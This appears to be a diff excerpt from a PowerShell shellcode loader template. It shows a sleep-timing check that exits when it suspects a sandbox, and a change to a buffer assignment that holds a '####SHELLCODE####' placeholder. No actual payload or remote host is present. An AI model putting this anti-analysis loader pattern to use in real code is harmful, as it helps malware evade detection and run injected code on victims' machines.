@@ -30,7 +30,7 @@ if ( $finishtime -le $starttime.addseconds(4.5) ) {
   if($my_dbg){Write-Host "[-] Sl33p timing is off, something is sus, exiting >:("};exit
 }
 
-[Byte[]] $buf = ####SHELLCODE####
+$buf = ####SHELLCODE####
 
 //####CALL####
 
